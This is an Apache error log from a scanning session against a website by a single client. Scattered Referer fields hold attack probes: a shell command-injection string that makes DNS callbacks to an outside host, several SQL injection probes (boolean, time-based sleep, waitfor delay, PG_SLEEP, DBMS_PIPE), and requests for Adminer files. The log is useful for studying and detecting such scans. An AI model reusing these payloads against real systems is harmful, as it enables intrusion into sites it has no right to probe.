[Thu Jul 08 00:37:09.957985 2021] [autoindex:error] [pid 31672] [client 27.147.202.214:8594] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:10.263322 2021] [autoindex:error] [pid 31680] [client 27.147.202.214:8585] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:10.278447 2021] [autoindex:error] [pid 31672] [client 27.147.202.214:8594] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:10.537118 2021] [autoindex:error] [pid 31393] [client 27.147.202.214:8589] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: ;(nslookup hitakyhxpwhbafff73.bxss.me||perl -e "gethostbyname('hitakyhxpwhbafff73.bxss.me')")|(nslookup hitakyhxpwhbafff73.bxss.me||perl -e "gethostbyname('hitakyhxpwhbafff73.bxss.me')")&(nslookup hitakyhxpwhbafff73.bxss.me||perl -e "gethostbyname('hitakyhxpwhbafff73.bxss.me')")
[Thu Jul 08 00:37:10.605631 2021] [autoindex:error] [pid 31672] [client 27.147.202.214:8594] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:10.934492 2021] [autoindex:error] [pid 31672] [client 27.147.202.214:8594] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:11.175099 2021] [autoindex:error] [pid 31538] [client 27.147.202.214:8577] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:11.238776 2021] [autoindex:error] [pid 31672] [client 27.147.202.214:8594] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:11.493266 2021] [php7:error] [pid 31656] [client 27.147.202.214:8584] script '/var/www/html/wilkescw.com/app_dev.php' not found or unable to stat
[Thu Jul 08 00:37:12.117536 2021] [autoindex:error] [pid 31536] [client 27.147.202.214:8578] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:12.442641 2021] [autoindex:error] [pid 31536] [client 27.147.202.214:8578] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:12.766961 2021] [autoindex:error] [pid 31680] [client 27.147.202.214:8585] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:13.395883 2021] [autoindex:error] [pid 29995] [client 27.147.202.214:8586] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:14.044548 2021] [autoindex:error] [pid 31659] [client 27.147.202.214:8580] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:15.481613 2021] [autoindex:error] [pid 30201] [client 27.147.202.214:8591] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: ekcWth94
[Thu Jul 08 00:37:15.911433 2021] [autoindex:error] [pid 31658] [client 27.147.202.214:8583] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: -1 OR 2+897-897-1=0+0+0+1 --
[Thu Jul 08 00:37:16.230552 2021] [autoindex:error] [pid 31680] [client 27.147.202.214:8585] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: -1 OR 2+753-753-1=0+0+0+1
[Thu Jul 08 00:37:16.604777 2021] [autoindex:error] [pid 31662] [client 27.147.202.214:8588] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: -1' OR 2+941-941-1=0+0+0+1 --
[Thu Jul 08 00:37:16.906435 2021] [autoindex:error] [pid 31670] [client 27.147.202.214:8590] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: -1' OR 2+151-151-1=0+0+0+1 or 'dLmceJMR'='
[Thu Jul 08 00:37:17.350986 2021] [autoindex:error] [pid 31666] [client 27.147.202.214:8592] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: -1" OR 2+600-600-1=0+0+0+1 --
[Thu Jul 08 00:37:18.622107 2021] [autoindex:error] [pid 31661] [client 27.147.202.214:8596] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:19.242175 2021] [autoindex:error] [pid 31393] [client 27.147.202.214:8589] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:20.490322 2021] [autoindex:error] [pid 31672] [client 27.147.202.214:8594] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:20.920480 2021] [autoindex:error] [pid 31665] [client 27.147.202.214:8602] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: if(now()=sysdate(),sleep(15),0)
[Thu Jul 08 00:37:21.067169 2021] [autoindex:error] [pid 31661] [client 27.147.202.214:8596] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:21.347395 2021] [autoindex:error] [pid 31677] [client 27.147.202.214:8597] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:22.841238 2021] [autoindex:error] [pid 31661] [client 27.147.202.214:8596] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:23.122068 2021] [autoindex:error] [pid 31677] [client 27.147.202.214:8597] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:23.723043 2021] [autoindex:error] [pid 31672] [client 27.147.202.214:8594] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:24.394568 2021] [autoindex:error] [pid 31666] [client 27.147.202.214:8592] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:25.003932 2021] [autoindex:error] [pid 31665] [client 27.147.202.214:8602] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: 0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
[Thu Jul 08 00:37:27.185464 2021] [autoindex:error] [pid 30201] [client 27.147.202.214:8591] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:28.683450 2021] [autoindex:error] [pid 31393] [client 27.147.202.214:8589] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:29.322686 2021] [autoindex:error] [pid 30201] [client 27.147.202.214:8591] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:37:32.423382 2021] [php7:error] [pid 30201] [client 27.147.202.214:8591] script '/var/www/html/wilkescw.com/app_dev.php' not found or unable to stat
[Thu Jul 08 00:37:33.571394 2021] [autoindex:error] [pid 31665] [client 27.147.202.214:8602] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: 0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z
[Thu Jul 08 00:37:41.910046 2021] [autoindex:error] [pid 31665] [client 27.147.202.214:8602] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: (select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
[Thu Jul 08 00:37:51.409138 2021] [autoindex:error] [pid 31665] [client 27.147.202.214:8602] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: 1 waitfor delay '0:0:15' --
[Thu Jul 08 00:37:56.944246 2021] [autoindex:error] [pid 31665] [client 27.147.202.214:8602] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: oJ2KsxbR'; waitfor delay '0:0:15' --
[Thu Jul 08 00:38:02.274378 2021] [autoindex:error] [pid 31665] [client 27.147.202.214:8602] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: Qp11zrjK' OR 112=(SELECT 112 FROM PG_SLEEP(15))--
[Thu Jul 08 00:38:09.525982 2021] [autoindex:error] [pid 31655] [client 27.147.202.214:10582] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: 4ZfFVG9w') OR 325=(SELECT 325 FROM PG_SLEEP(15))--
[Thu Jul 08 00:38:17.979514 2021] [autoindex:error] [pid 31698] [client 27.147.202.214:10669] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: RTzxiwS3')) OR 286=(SELECT 286 FROM PG_SLEEP(15))--
[Thu Jul 08 00:38:23.980665 2021] [autoindex:error] [pid 31659] [client 27.147.202.214:10642] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
[Thu Jul 08 00:38:24.282229 2021] [autoindex:error] [pid 31655] [client 27.147.202.214:10582] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: 1'"
[Thu Jul 08 00:38:24.584102 2021] [autoindex:error] [pid 31655] [client 27.147.202.214:10582] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: 1 \xc0\xa7\xc0\xa2%2527%2522
[Thu Jul 08 00:38:24.901349 2021] [autoindex:error] [pid 31655] [client 27.147.202.214:10582] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: @@dAgXh
[Thu Jul 08 00:38:30.877941 2021] [autoindex:error] [pid 31988] [client 27.147.202.214:11432] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:38:37.556395 2021] [autoindex:error] [pid 31988] [client 27.147.202.214:11432] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:38:45.607524 2021] [autoindex:error] [pid 31726] [client 27.147.202.214:6802] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:38:45.938775 2021] [autoindex:error] [pid 31649] [client 27.147.202.214:10655] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:38:46.258169 2021] [autoindex:error] [pid 31649] [client 27.147.202.214:10655] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:38:46.547973 2021] [autoindex:error] [pid 31649] [client 27.147.202.214:10655] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:38:46.867432 2021] [autoindex:error] [pid 31649] [client 27.147.202.214:10655] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:38:47.201898 2021] [autoindex:error] [pid 31649] [client 27.147.202.214:10655] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:38:55.110660 2021] [autoindex:error] [pid 31726] [client 27.147.202.214:6802] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:39:05.545111 2021] [autoindex:error] [pid 31727] [client 27.147.202.214:2217] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:39:12.892701 2021] [autoindex:error] [pid 31727] [client 27.147.202.214:2217] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:39:21.438848 2021] [autoindex:error] [pid 31727] [client 27.147.202.214:2217] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:39:29.677660 2021] [autoindex:error] [pid 31912] [client 27.147.202.214:2438] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:39:45.163141 2021] [autoindex:error] [pid 31912] [client 27.147.202.214:2438] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:39:56.650721 2021] [autoindex:error] [pid 31329] [client 27.147.202.214:4351] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:40:06.037931 2021] [autoindex:error] [pid 31329] [client 27.147.202.214:4351] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:40:14.451762 2021] [autoindex:error] [pid 31329] [client 27.147.202.214:4351] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:40:26.228660 2021] [autoindex:error] [pid 31329] [client 27.147.202.214:4351] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:40:26.556979 2021] [autoindex:error] [pid 31667] [client 27.147.202.214:12606] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:40:26.876983 2021] [autoindex:error] [pid 31667] [client 27.147.202.214:12606] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:40:27.204751 2021] [autoindex:error] [pid 31667] [client 27.147.202.214:12606] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:40:38.465239 2021] [autoindex:error] [pid 31652] [client 27.147.202.214:12616] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:40:54.825417 2021] [autoindex:error] [pid 31652] [client 27.147.202.214:12616] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:41:10.790385 2021] [autoindex:error] [pid 31652] [client 27.147.202.214:12616] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:41:11.108392 2021] [autoindex:error] [pid 31540] [client 27.147.202.214:13797] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:41:11.434157 2021] [autoindex:error] [pid 31540] [client 27.147.202.214:13797] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:41:11.749730 2021] [autoindex:error] [pid 31654] [client 27.147.202.214:14519] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:41:12.061816 2021] [autoindex:error] [pid 31654] [client 27.147.202.214:14519] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:41:12.377306 2021] [autoindex:error] [pid 31654] [client 27.147.202.214:14519] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:41:25.489872 2021] [autoindex:error] [pid 32342] [client 27.147.202.214:3226] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:41:36.987658 2021] [autoindex:error] [pid 31451] [client 27.147.202.214:2388] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:41:48.432048 2021] [autoindex:error] [pid 31451] [client 27.147.202.214:2388] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:42:01.178348 2021] [autoindex:error] [pid 31451] [client 27.147.202.214:2388] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:42:16.707838 2021] [autoindex:error] [pid 31451] [client 27.147.202.214:3314] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:42:36.329183 2021] [autoindex:error] [pid 32699] [client 27.147.202.214:3337] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:42:48.908785 2021] [autoindex:error] [pid 32699] [client 27.147.202.214:3337] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:43:02.987040 2021] [autoindex:error] [pid 32699] [client 27.147.202.214:3337] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:43:18.494479 2021] [autoindex:error] [pid 32499] [client 27.147.202.214:4224] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:43:32.069541 2021] [autoindex:error] [pid 31315] [client 27.147.202.214:5595] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:43:34.026516 2021] [autoindex:error] [pid 663] [client 27.147.202.214:3684] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:43:34.347268 2021] [autoindex:error] [pid 31315] [client 27.147.202.214:5595] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:43:34.675045 2021] [autoindex:error] [pid 31315] [client 27.147.202.214:5595] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 02:42:17.042616 2021] [http:error] [pid 17353] [client 27.147.202.214:5421] AH02430: Response header 'Location' value of 'https://www.wilkescw.com/\n.example.com' contains invalid characters, aborting request
[Thu Jul 08 02:42:17.129617 2021] [php7:error] [pid 16511] [client 27.147.202.214:5380] script '/var/www/html/wilkescw.com/adminer-4.2.5-en.php' not found or unable to stat, referer: https://www.wilkescw.com/
[Thu Jul 08 02:42:17.362963 2021] [php7:error] [pid 17748] [client 27.147.202.214:5387] script '/var/www/html/wilkescw.com/adminer-4.3.1.php' not found or unable to stat, referer: https://www.wilkescw.com/
